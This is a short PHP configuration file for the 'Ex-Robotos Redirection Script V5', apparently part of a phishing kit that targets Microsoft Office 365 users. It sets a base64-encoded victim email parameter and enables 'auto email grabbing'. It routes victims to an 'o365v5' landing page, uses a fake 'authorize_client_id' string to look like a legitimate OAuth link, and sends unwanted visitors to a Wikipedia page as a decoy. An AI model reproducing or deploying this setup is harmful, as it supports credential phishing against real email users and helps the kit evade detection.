<?php
/* 
Ex-Robotos Redirection Script V5 2022
fb.com/Ex.Robotos
@Ex_Robotos_official
@Ex.Robotos
*/

//http://page.com/redirect/?[email]=base64
//Or
//http://page.com/redirect/?[randomstring]&[email]=base64
//exemple: https://domain.com/redirectv5/authorize_client_id:kfu2dwbn?email=YnJhaGltZWxAZXhyb2J0b3Mub25taWNyb3NvZnQuY29t
$param = 'email';//http://page.com/redirect/?[email]=base64
$autoHash="false";
$autoEmail="true";//"true":Auto email grabing
$pagelink="https://domain.com/o365v5"; //your ex-robotos page link
$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
$redirecttype="2";// 1:header - 2:script
$randpart='auth0rize_client_id:';
?>